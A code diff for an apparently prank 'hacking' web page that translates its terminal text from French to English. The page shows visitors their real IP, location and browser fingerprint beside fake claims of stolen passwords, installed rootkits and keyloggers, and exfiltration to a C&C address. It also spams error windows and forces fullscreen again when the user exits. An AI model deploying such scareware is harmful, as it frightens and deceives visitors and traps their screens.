-                { text: `│ Orientation        : ${systemInfo.orientation}`, class: 'white', delay: 150, sound: 'type' },
-                { text: '└───────────────────────────────────────────────────────┘', class: 'cyan', delay: 100, sound: null },
-                { text: '', class: '', delay: 150, sound: null },
-                { text: '┌─ ÉTAT SYSTÈME ────────────────────────────────────────┐', class: 'cyan', delay: 100, sound: null },
-                { text: `│ Niveau batterie    : ${systemInfo.batteryLevel}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ État charge        : ${systemInfo.batteryCharging}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Cookies activés    : ${systemInfo.cookieEnabled ? 'Oui' : 'Non'}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Do Not Track       : ${systemInfo.doNotTrack}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Date/Heure locale  : ${systemInfo.localTime}`, class: 'white', delay: 150, sound: 'type' },
-                { text: `│ Canvas Fingerprint : ${systemInfo.canvasFingerprint}`, class: 'white', delay: 150, sound: 'type' },
-                { text: '└───────────────────────────────────────────────────────┘', class: 'cyan', delay: 100, sound: null },
-                { text: '', class: '', delay: 300, sound: null },
-                { text: '[ENUM] Énumération des données sensibles...', class: 'yellow', delay: 250, sound: 'disk' },
-                { text: '', class: '', delay: 150, sound: null },
-                { text: '> Scan du système de fichiers...', class: '', delay: 200, sound: 'disk' },
-                { text: '  C:\\Users\\Documents\\', class: 'cyan', delay: 120, sound: 'type' },
-                { text: '  C:\\Users\\Downloads\\', class: 'cyan', delay: 120, sound: 'type' },
-                { text: '  C:\\Users\\Desktop\\', class: 'cyan', delay: 120, sound: 'type' },
-                { text: '  C:\\Users\\Pictures\\', class: 'cyan', delay: 120, sound: 'type' },
-                { text: '  C:\\Users\\Videos\\', class: 'cyan', delay: 120, sound: 'type' },
-                { text: '', class: '', delay: 100, sound: null },
-                { text: '> Extraction des credentials navigateur...', class: '', delay: 250, sound: 'disk' },
-                { text: '  [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] Chrome - 47 mots de passe', class: 'yellow', delay: 300, sound: 'data' },
-                { text: '  [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] Firefox - 23 mots de passe', class: 'yellow', delay: 300, sound: null },
-                { text: '  [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] Edge - 31 mots de passe', class: 'yellow', delay: 300, sound: null },
-                { text: '  [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] Safari - 18 mots de passe', class: 'yellow', delay: 300, sound: null },
-                { text: '', class: '', delay: 100, sound: null },
-                { text: '  [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 2,394 cookies extraits', class: 'yellow', delay: 250, sound: null },
-                { text: '  [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 8,847 entrées d\'historique', class: 'yellow', delay: 250, sound: null },
-                { text: '  [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 156 sessions actives', class: 'yellow', delay: 250, sound: null },
-                { text: '', class: '', delay: 200, sound: null },
-                { text: '[!] FICHIERS CRITIQUES IDENTIFIÉS :', class: 'red', delay: 250, sound: 'alert' },
-                { text: '', class: '', delay: 100, sound: null },
-                { text: '  ⚠ passwords_backup.txt (4.2 KB)', class: 'red', delay: 150, sound: 'type' },
-                { text: '  ⚠ banking_credentials.xlsx (28 KB)', class: 'red', delay: 150, sound: 'type' },
-                { text: '  ⚠ crypto_wallet_seeds.txt (1.8 KB)', class: 'red', delay: 150, sound: 'type' },
-                { text: '  ⚠ tax_documents_2024.pdf (2.3 MB)', class: 'red', delay: 150, sound: 'type' },
-                { text: '  ⚠ identity_scans/ (12 fichiers, 18 MB)', class: 'red', delay: 150, sound: 'type' },
-                { text: '  ⚠ private_keys/ (SSH/GPG keys)', class: 'red', delay: 150, sound: 'type' },
-                { text: '  ⚠ personal_photos/ (1,847 fichiers, 4.2 GB)', class: 'red', delay: 150, sound: 'type' },
+                { text: '████████████████████████████████████████████████████████████████', class: 'red', delay: 30, sound: 'critical' },
+                { text: '█                                                              █', class: 'red', delay: 15, sound: null },
+                { text: '█          [UNAUTHORIZED ACCESS - INTRUSION DETECTED]          █', class: 'red', delay: 15, sound: 'alert' },
+                { text: '█              SYSTEM COMPROMISE IN PROGRESS                   █', class: 'red', delay: 15, sound: null },
+                { text: '█                                                              █', class: 'red', delay: 15, sound: null },
+                { text: '████████████████████████████████████████████████████████████████', class: 'red', delay: 30, sound: null },
                 { text: '', class: '', delay: 250, sound: null },
-                { text: '[PAYLOAD] Déploiement des backdoors...', class: 'yellow', delay: 300, sound: 'type' },
-                { text: '', class: '', delay: 100, sound: null },
-                { text: '> Installation: rootkit.sys (persistance kernel)', class: '', delay: 200, sound: 'disk' },
-                { text: '  [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] Installé', class: 'cyan', delay: 400, sound: null },
-                { text: '> Installation: keylogger.dll (capture clavier)', class: '', delay: 200, sound: 'disk' },
-                { text: '  [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] Installé', class: 'cyan', delay: 400, sound: null },
-                { text: '> Installation: remote_shell.exe (RAT)', class: '', delay: 200, sound: 'disk' },
-                { text: '  [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] Installé', class: 'cyan', delay: 400, sound: null },
-                { text: '> Installation: screen_capture.dll', class: '', delay: 200, sound: 'disk' },
-                { text: '  [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] Installé', class: 'cyan', delay: 400, sound: null },
+                { text: '[00:00:01.234] Initializing attack vector...', class: 'yellow', delay: 120, sound: 'key' },
+                { text: '[00:00:01.456] Loading exploitation framework...', class: 'yellow', delay: 120, sound: 'key' },
+                { text: '[00:00:01.678] Establishing encrypted tunnel...', class: 'yellow', delay: 150, sound: 'key' },
+                { text: '', class: '', delay: 80, sound: null },
+                { text: '> Connecting to C&C server (185.220.101.47:4444)...', class: '', delay: 150, sound: 'key' },
+                { text: '> TLS handshake initiated...', class: '', delay: 150, sound: 'key' },
+                { text: '> AES-256-GCM encryption established', class: 'cyan', delay: 200, sound: null },
+                { text: '> Connection authenticated', class: 'cyan', delay: 200, sound: null },
+                { text: '', class: '', delay: 80, sound: null },
+                { text: '[▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░] 12%', class: 'yellow', delay: 200, sound: null },
+                { text: '[▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░] 24%', class: 'yellow', delay: 200, sound: null },
+                { text: '[▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░] 36%', class: 'yellow', delay: 200, sound: null },
+                { text: '[▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░] 48%', class: 'yellow', delay: 200, sound: null },
+                { text: '[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░] 60%', class: 'yellow', delay: 200, sound: null },
+                { text: '[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░] 72%', class: 'yellow', delay: 200, sound: null },
+                { text: '[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░] 84%', class: 'yellow', delay: 200, sound: null },
+                { text: '[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 100%', class: 'cyan', delay: 200, sound: 'data' },
+                { text: '', class: '', delay: 80, sound: null },
+                { text: '[SUCCESS] Secure connection established', class: 'cyan', delay: 250, sound: null },
                 { text: '', class: '', delay: 150, sound: null },
-                { text: '[SUCCESS] Persistance établie (Registre + Tâches planifiées)', class: 'cyan', delay: 300, sound: null },
-                { text: '[SUCCESS] Hooks installés dans le noyau', class: 'cyan', delay: 300, sound: null },
-                { text: '[SUCCESS] Détection antivirus contournée', class: 'cyan', delay: 300, sound: null },
+                { text: '[ENUM] Enumerating target system...', class: 'yellow', delay: 150, sound: 'key' },
+                { text: '[ENUM] Scanning for vulnerabilities...', class: 'yellow', delay: 150, sound: 'disk' },
+                { text: '[ENUM] Mapping attack surface...', class: 'yellow', delay: 150, sound: 'disk' },
+                { text: '', class: '', delay: 100, sound: null },
+                { text: '[EXPLOIT] CVE-2024-38063: Windows TCP/IP RCE', class: 'yellow', delay: 250, sound: 'key' },
+                { text: '[EXPLOIT] Bypassing ASLR protection...', class: 'yellow', delay: 250, sound: 'key' },
+                { text: '[EXPLOIT] Disabling Windows Defender...', class: 'yellow', delay: 250, sound: 'key' },
+                { text: '[EXPLOIT] Escalating to SYSTEM privileges...', class: 'yellow', delay: 250, sound: 'key' },
+                { text: '', class: '', delay: 80, sound: null },
+                { text: '[OK] Root access acquired', class: 'cyan', delay: 250, sound: 'alert' },
+                { text: '[OK] All security mechanisms disabled', class: 'cyan', delay: 250, sound: null },
+                { text: '', class: '', delay: 150, sound: null },
+                { text: '═══════════════════════════════════════════════════════════════', class: 'white', delay: 30, sound: null },
+                { text: '                   TARGET PROFILE EXTRACTION', class: 'red', delay: 80, sound: 'alert' },
+                { text: '═══════════════════════════════════════════════════════════════', class: 'white', delay: 30, sound: null },
+                { text: '', class: '', delay: 120, sound: null },
+                { text: '┌─ NETWORK INTELLIGENCE ──────────────────────────────────────┐', class: 'cyan', delay: 80, sound: null },
+                { text: `│ IPv4 Address        │ ${systemInfo.ip}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Physical Location   │ ${systemInfo.city}, ${systemInfo.region}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Country             │ ${systemInfo.country}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Postal Code         │ ${systemInfo.postal}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ GPS Coordinates     │ ${systemInfo.latitude}, ${systemInfo.longitude}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ ISP Provider        │ ${systemInfo.isp}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Timezone            │ ${systemInfo.timezone}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Connection Type     │ ${systemInfo.connectionEffectiveType}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Bandwidth           │ ${systemInfo.connectionDownlink}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Network Latency     │ ${systemInfo.connectionRtt}`, class: 'white', delay: 120, sound: 'key' },
+                { text: '└──────────────────────────────────────────────────────────────┘', class: 'cyan', delay: 80, sound: null },
+                { text: '', class: '', delay: 120, sound: null },
+                { text: '┌─ SYSTEM CONFIGURATION ───────────────────────────────────────┐', class: 'cyan', delay: 80, sound: null },
+                { text: `│ Browser             │ ${systemInfo.browser}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Operating System    │ ${systemInfo.platform}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ User Agent          │ ${systemInfo.userAgent.substring(0, 40)}...`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ System Language     │ ${systemInfo.language}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Available Languages │ ${systemInfo.languages}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ CPU Cores           │ ${systemInfo.hardwareConcurrency} logical processors`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ System Memory       │ ${systemInfo.deviceMemory}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ GPU Vendor          │ ${systemInfo.webglVendor}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ GPU Renderer        │ ${systemInfo.webglRenderer}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Touch Support       │ ${systemInfo.maxTouchPoints} touch points`, class: 'white', delay: 120, sound: 'key' },
+                { text: '└──────────────────────────────────────────────────────────────┘', class: 'cyan', delay: 80, sound: null },
+                { text: '', class: '', delay: 120, sound: null },
+                { text: '┌─ DISPLAY SPECIFICATIONS ─────────────────────────────────────┐', class: 'cyan', delay: 80, sound: null },
+                { text: `│ Screen Resolution   │ ${systemInfo.screenWidth}x${systemInfo.screenHeight} pixels`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Window Size         │ ${systemInfo.windowWidth}x${systemInfo.windowHeight} pixels`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Color Depth         │ ${systemInfo.screenColorDepth}-bit`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Pixel Ratio         │ ${systemInfo.devicePixelRatio}x`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Available Space     │ ${systemInfo.availWidth}x${systemInfo.availHeight} pixels`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Orientation         │ ${systemInfo.orientation}`, class: 'white', delay: 120, sound: 'key' },
+                { text: '└──────────────────────────────────────────────────────────────┘', class: 'cyan', delay: 80, sound: null },
+                { text: '', class: '', delay: 120, sound: null },
+                { text: '┌─ SYSTEM STATUS ──────────────────────────────────────────────┐', class: 'cyan', delay: 80, sound: null },
+                { text: `│ Battery Level       │ ${systemInfo.batteryLevel}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Power Status        │ ${systemInfo.batteryCharging}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Cookies Enabled     │ ${systemInfo.cookieEnabled ? 'Yes' : 'No'}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Do Not Track        │ ${systemInfo.doNotTrack}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Local Time          │ ${systemInfo.localTime}`, class: 'white', delay: 120, sound: 'key' },
+                { text: `│ Canvas Fingerprint  │ ${systemInfo.canvasFingerprint}`, class: 'white', delay: 120, sound: 'key' },
+                { text: '└──────────────────────────────────────────────────────────────┘', class: 'cyan', delay: 80, sound: null },
                 { text: '', class: '', delay: 250, sound: null },
-                { text: '[EXFIL] Début de l\'exfiltration des données...', class: 'yellow', delay: 300, sound: 'type' },
-                { text: '', class: '', delay: 150, sound: null },
-                { text: '  Serveur cible : 185.220.101.47:4444 (TOR)', class: 'yellow', delay: 200, sound: 'type' },
-                { text: '  Protocole     : HTTPS + Chiffrement AES-256', class: 'yellow', delay: 200, sound: 'type' },
-                { text: '  Méthode       : Tunneling DNS (furtif)', class: 'yellow', delay: 200, sound: 'type' },
-                { text: '', class: '', delay: 150, sound: null },
-                { text: '  [▓▓░░░░░░░░░░░░░░░░] 1.2 GB / 11.4 GB (10%)', class: 'cyan', delay: 500, sound: 'data' },
-                { text: '  [▓▓▓▓░░░░░░░░░░░░░░] 2.8 GB / 11.4 GB (25%)', class: 'cyan', delay: 500, sound: 'data' },
-                { text: '  [▓▓▓▓▓▓▓░░░░░░░░░░░] 5.1 GB / 11.4 GB (45%)', class: 'cyan', delay: 500, sound: 'data' },
-                { text: '  [▓▓▓▓▓▓▓▓▓▓░░░░░░░░] 7.3 GB / 11.4 GB (64%)', class: 'cyan', delay: 500, sound: 'data' },
-                { text: '  [▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░] 9.2 GB / 11.4 GB (81%)', class: 'cyan', delay: 500, sound: 'data' },
-                { text: '  [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 11.4 GB / 11.4 GB (100%)', class: 'cyan', delay: 500, sound: 'data' },
-                { text: '', class: '', delay: 200, sound: null },
-                { text: '[SUCCESS] Transfert terminé avec succès', class: 'cyan', delay: 300, sound: 'alert' },
-                { text: '[SUCCESS] Logs système purgés', class: 'cyan', delay: 300, sound: null },
-                { text: '[SUCCESS] Traces réseau effacées', class: 'cyan', delay: 300, sound: null },
-                { text: '', class: '', delay: 300, sound: null },
-                { text: '╔═══════════════════════════════════════════════════════╗', class: 'red', delay: 50, sound: 'critical' },
-                { text: '║                                                       ║', class: 'red', delay: 30, sound: null },
-                { text: '║              💀 COMPROMISSION TOTALE 💀               ║', class: 'red', delay: 30, sound: null },
-                { text: '║                                                       ║', class: 'red', delay: 30, sound: null },
-                { text: '║      Votre système est maintenant sous contrôle      ║', class: 'red', delay: 30, sound: null },
-                { text: '║           Toutes les données ont été volées          ║', class: 'red', delay: 30, sound: null },
-                { text: '║                                                       ║', class: 'red', delay: 30, sound: null },
-                { text: '╚═══════════════════════════════════════════════════════╝', class: 'red', delay: 50, sound: null },
-                { text: '', class: '', delay: 300, sound: null },
-                { text: '═══ RÉSUMÉ DE L\'ATTAQUE ═══', class: 'yellow', delay: 200, sound: null },
+                { text: '[DUMP] Extracting sensitive data...', class: 'yellow', delay: 200, sound: 'disk' },
                 { text: '', class: '', delay: 100, sound: null },
-                { text: '  ✓ Accès root/SYSTEM         : ACQUIS', class: 'cyan', delay: 150, sound: 'type' },
-                { text: '  ✓ Défenses désactivées      : CONFIRMÉ', class: 'cyan', delay: 150, sound: 'type' },
-                { text: '  ✓ Backdoor persistant       : ACTIF', class: 'cyan', delay: 150, sound: 'type' },
-                { text: '  ✓ Keylogger                 : EN MARCHE', class: 'cyan', delay: 150, sound: 'type' },
-                { text: '  ✓ Capture d\'écran           : ACTIVÉE', class: 'cyan', delay: 150, sound: 'type' },
-                { text: '  ✓ Accès webcam              : DISPONIBLE', class: 'cyan', delay: 150, sound: 'type' },
-                { text: '  ✓ Accès microphone          : DISPONIBLE', class: 'cyan', delay: 150, sound: 'type' },
-                { text: '  ✓ Contrôle système complet  : OBTENU', class: 'cyan', delay: 150, sound: 'type' },
-                { text: '  ✓ Données exfiltrées        : 11.4 GB', class: 'cyan', delay: 150, sound: 'type' },
-                { text: '  ✓ Connexion C&C             : STABLE', class: 'cyan', delay: 150, sound: 'type' },
-                { text: '', class: '', delay: 300, sound: null },
-                { text: '[!] La surveillance continue en arrière-plan...', class: 'red', delay: 300, sound: 'alert' },
-                { text: '[!] Impossible de détecter ou supprimer les backdoors', class: 'red', delay: 300, sound: null },
-                { text: '', class: '', delay: 400, sound: null },
-                { text: 'root@darknet-c2:~# ', class: 'cursor', delay: 0, sound: null }
+                { text: '> Scanning filesystem...', class: '', delay: 150, sound: 'disk' },
+                { text: '  C:\\Users\\Documents\\', class: 'cyan', delay: 100, sound: 'key' },
+                { text: '  C:\\Users\\Downloads\\', class: 'cyan', delay: 100, sound: 'key' },
+                { text: '  C:\\Users\\Desktop\\', class: 'cyan', delay: 100, sound: 'key' },
+                { text: '  C:\\Users\\Pictures\\', class: 'cyan', delay: 100, sound: 'key' },
+                { text: '  C:\\Users\\Videos\\', class: 'cyan', delay: 100, sound: 'key' },
+                { text: '  C:\\Users\\AppData\\', class: 'cyan', delay: 100, sound: 'key' },
+                { text: '', class: '', delay: 100, sound: null },
+                { text: '> Harvesting credentials...', class: '', delay: 200, sound: 'disk' },
+                { text: '  [████████████████] Chrome passwords (52 entries)', class: 'yellow', delay: 250, sound: 'data' },
+                { text: '  [████████████████] Firefox passwords (28 entries)', class: 'yellow', delay: 250, sound: null },
+                { text: '  [████████████████] Edge passwords (34 entries)', class: 'yellow', delay: 250, sound: null },
+                { text: '  [████████████████] Safari passwords (19 entries)', class: 'yellow', delay: 250, sound: null },
+                { text: '', class: '', delay: 100, sound: null },
+                { text: '  [████████████████] 2,847 cookies extracted', class: 'yellow', delay: 200, sound: null },
+                { text: '  [████████████████] 9,234 history entries', class: 'yellow', delay: 200, sound: null },
+                { text: '  [████████████████] 187 active sessions', class: 'yellow', delay: 200, sound: null },
+                { text: '', class: '', delay: 150, sound: null },
+                { text: '[CRITICAL] High-value targets identified:', class: 'red', delay: 200, sound: 'alert' },
+                { text: '', class: '', delay: 80, sound: null },
+                { text: '  ⚠ passwords_backup.txt (4.8 KB)', class: 'red', delay: 120, sound: 'key' },
+                { text: '  ⚠ banking_information.xlsx (32 KB)', class: 'red', delay: 120, sound: 'key' },
+                { text: '  ⚠ cryptocurrency_wallets.dat (2.1 KB)', class: 'red', delay: 120, sound: 'key' },
+                { text: '  ⚠ tax_documents_2024.pdf (2.8 MB)', class: 'red', delay: 120, sound: 'key' },
+                { text: '  ⚠ identity_documents/ (15 files, 24 MB)', class: 'red', delay: 120, sound: 'key' },
+                { text: '  ⚠ ssh_keys/ (RSA/ED25519 private keys)', class: 'red', delay: 120, sound: 'key' },
+                { text: '  ⚠ personal_media/ (2,143 files, 5.7 GB)', class: 'red', delay: 120, sound: 'key' },
+                { text: '', class: '', delay: 200, sound: null },
+                { text: '[PAYLOAD] Deploying persistence mechanisms...', class: 'yellow', delay: 250, sound: 'key' },
+                { text: '', class: '', delay: 80, sound: null },
+                { text: '> Installing: rootkit.sys (kernel-mode driver)', class: '', delay: 150, sound: 'disk' },
+                { text: '  [████████████████████] Installed', class: 'cyan', delay: 350, sound: null },
+                { text: '> Installing: keylogger.dll (keystroke capture)', class: '', delay: 150, sound: 'disk' },
+                { text: '  [████████████████████] Installed', class: 'cyan', delay: 350, sound: null },
+                { text: '> Installing: rat.exe (remote administration)', class: '', delay: 150, sound: 'disk' },
+                { text: '  [████████████████████] Installed', class: 'cyan', delay: 350, sound: null },
+                { text: '> Installing: screencap.dll (screen monitoring)', class: '', delay: 150, sound: 'disk' },
+                { text: '  [████████████████████] Installed', class: 'cyan', delay: 350, sound: null },
+                { text: '', class: '', delay: 100, sound: null },
+                { text: '[OK] Persistence achieved (Registry + Scheduled Tasks)', class: 'cyan', delay: 250, sound: null },
+                { text: '[OK] Kernel hooks installed', class: 'cyan', delay: 250, sound: null },
+                { text: '[OK] AV detection bypassed', class: 'cyan', delay: 250, sound: null },
+                { text: '', class: '', delay: 200, sound: null },
+                { text: '[EXFIL] Initiating data exfiltration...', class: 'yellow', delay: 250, sound: 'key' },
+                { text: '', class: '', delay: 100, sound: null },
+                { text: '  Target: 185.220.101.47:4444 (TOR Hidden Service)', class: 'yellow', delay: 150, sound: 'key' },
+                { text: '  Protocol: HTTPS + Steganography', class: 'yellow', delay: 150, sound: 'key' },
+                { text: '  Method: DNS Tunneling (Covert Channel)', class: 'yellow', delay: 150, sound: 'key' },
+                { text: '', class: '', delay: 120, sound: null },
+                { text: '  [▓▓░░░░░░░░░░░░░░░░░] 1.4 GB / 12.8 GB (11%)', class: 'cyan', delay: 450, sound: 'data' },
+                { text: '  [▓▓▓▓░░░░░░░░░░░░░░░] 3.2 GB / 12.8 GB (25%)', class: 'cyan', delay: 450, sound: 'data' },
+                { text: '  [▓▓▓▓▓▓▓░░░░░░░░░░░░] 5.8 GB / 12.8 GB (45%)', class: 'cyan', delay: 450, sound: 'data' },
+                { text: '  [▓▓▓▓▓▓▓▓▓▓░░░░░░░░░] 8.3 GB / 12.8 GB (65%)', class: 'cyan', delay: 450, sound: 'data' },
+                { text: '  [▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░] 10.6 GB / 12.8 GB (83%)', class: 'cyan', delay: 450, sound: 'data' },
+                { text: '  [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 12.8 GB / 12.8 GB (100%)', class: 'cyan', delay: 450, sound: 'data' },
+                { text: '', class: '', delay: 150, sound: null },
+                { text: '[SUCCESS] Data transfer completed', class: 'cyan', delay: 250, sound: 'alert' },
+                { text: '[SUCCESS] Event logs cleared', class: 'cyan', delay: 250, sound: null },
+                { text: '[SUCCESS] Network traces removed', class: 'cyan', delay: 250, sound: null },
+                { text: '', class: '', delay: 250, sound: null },
+                { text: '╔═══════════════════════════════════════════════════════════════╗', class: 'red', delay: 30, sound: 'critical' },
+                { text: '║                                                               ║', class: 'red', delay: 20, sound: null },
+                { text: '║                   ☠ TOTAL COMPROMISE ☠                        ║', class: 'red', delay: 20, sound: null },
+                { text: '║                                                               ║', class: 'red', delay: 20, sound: null },
+                { text: '║           System under complete remote control                ║', class: 'red', delay: 20, sound: null },
+                { text: '║              All data successfully exfiltrated                ║', class: 'red', delay: 20, sound: null },
+                { text: '║                                                               ║', class: 'red', delay: 20, sound: null },
+                { text: '╚═══════════════════════════════════════════════════════════════╝', class: 'red', delay: 30, sound: null },
+                { text: '', class: '', delay: 250, sound: null },
+                { text: '═══ COMPROMISE SUMMARY ═══', class: 'yellow', delay: 150, sound: null },
+                { text: '', class: '', delay: 80, sound: null },
+                { text: '  ✓ Root/SYSTEM Access     : OBTAINED', class: 'cyan', delay: 120, sound: 'key' },
+                { text: '  ✓ Security Disabled      : CONFIRMED', class: 'cyan', delay: 120, sound: 'key' },
+                { text: '  ✓ Persistent Backdoor    : ACTIVE', class: 'cyan', delay: 120, sound: 'key' },
+                { text: '  ✓ Keystroke Logger       : RUNNING', class: 'cyan', delay: 120, sound: 'key' },
+                { text: '  ✓ Screen Monitoring      : ENABLED', class: 'cyan', delay: 120, sound: 'key' },
+                { text: '  ✓ Camera Access          : AVAILABLE', class: 'cyan', delay: 120, sound: 'key' },
+                { text: '  ✓ Microphone Access      : AVAILABLE', class: 'cyan', delay: 120, sound: 'key' },
+                { text: '  ✓ Full System Control    : ACHIEVED', class: 'cyan', delay: 120, sound: 'key' },
+                { text: '  ✓ Data Exfiltrated       : 12.8 GB', class: 'cyan', delay: 120, sound: 'key' },
+                { text: '  ✓ C&C Connection         : STABLE', class: 'cyan', delay: 120, sound: 'key' },
+                { text: '', class: '', delay: 250, sound: null },
+                { text: '[STATUS] Surveillance active - monitoring continues', class: 'red', delay: 250, sound: 'alert' },
+                { text: '[STATUS] Backdoor undetectable by current security solutions', class: 'red', delay: 250, sound: null },
+                { text: '', class: '', delay: 350, sound: null },
+                { text: 'root@c2-server:~# ', class: 'cursor', delay: 0, sound: null }
             ];
 
             for (let msg of hackingMessages) {
                 await new Promise(resolve => setTimeout(resolve, msg.delay));
                 
-                // Jouer le son approprié
-                if (msg.sound === 'type') {
-                    playTypingSound();
+                if (msg.sound === 'key') {
+                    playKeyboardSound();
                 } else if (msg.sound === 'alert') {
                     playAlertSound();
                 } else if (msg.sound === 'data') {
@@ -1287,39 +1308,30 @@
                 terminal.scrollTop = terminal.scrollHeight;
             }
 
-            // Après 3 secondes, afficher l'écran bleu final
             setTimeout(() => {
                 showFinalBsod();
             }, 3000);
         }
 
-        // Créer des erreurs au clic
         document.addEventListener('click', (e) => {
             if (!clickHappened && !hackingStarted) {
                 clickHappened = true;
-                
-                // Passer en plein écran
                 requestFullscreen();
-                
-                // Initialiser l'audio au premier clic
                 initAudio();
                 
-                // Créer BEAUCOUP d'erreurs (entre 15 et 25)
-                const numErrors = Math.floor(Math.random() * 11) + 15;
+                const numErrors = Math.floor(Math.random() * 11) + 18;
                 for (let i = 0; i < numErrors; i++) {
                     setTimeout(() => {
                         createErrorWindow();
                         playErrorBeep();
-                    }, i * 100);
+                    }, i * 90);
                 }
 
-                // Continuer à créer des erreurs pendant 5 secondes
                 const errorInterval = setInterval(() => {
                     createErrorWindow();
                     playErrorBeep();
-                }, 300);
+                }, 280);
 
-                // Après 5 secondes, passer à l'écran de hacking
                 setTimeout(() => {
                     clearInterval(errorInterval);
                     startHacking();
@@ -1327,10 +1339,8 @@
             }
         });
 
-        // Empêcher de sortir du plein écran avec Echap (ne marche pas toujours pour des raisons de sécurité)
         document.addEventListener('fullscreenchange', () => {
             if (!document.fullscreenElement && clickHappened) {
-                // Essayer de remettre en plein écran
                 requestFullscreen();
             }
         });
